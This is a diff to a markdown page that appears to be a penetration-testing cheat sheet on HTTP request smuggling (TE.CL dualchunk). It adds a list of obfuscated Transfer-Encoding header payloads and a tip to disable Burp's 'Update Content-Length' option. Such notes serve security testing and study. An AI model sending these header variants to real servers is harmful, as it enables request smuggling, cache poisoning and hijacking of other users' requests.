@@ -489,9 +489,30 @@ x=1
 
 ### TE.CL dualchunk - Transfer-encoding obfuscated  
 
->If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use [obfuscating](#obfuscation) techniques with second TE.  
+>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use **obfuscation** techniques with second TE.  
 
->Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is [obfuscated](#obfuscation) in some way. Ways to obfuscate the Transfer-Encoding header.  
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+Transfer-encoding: identity
+Transfer-encoding: cow
+```  
+
+>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is **obfuscation** in some way.  
 
 >On Repeater menu ensure that the **"Update Content-Length"** option is unchecked.  
 
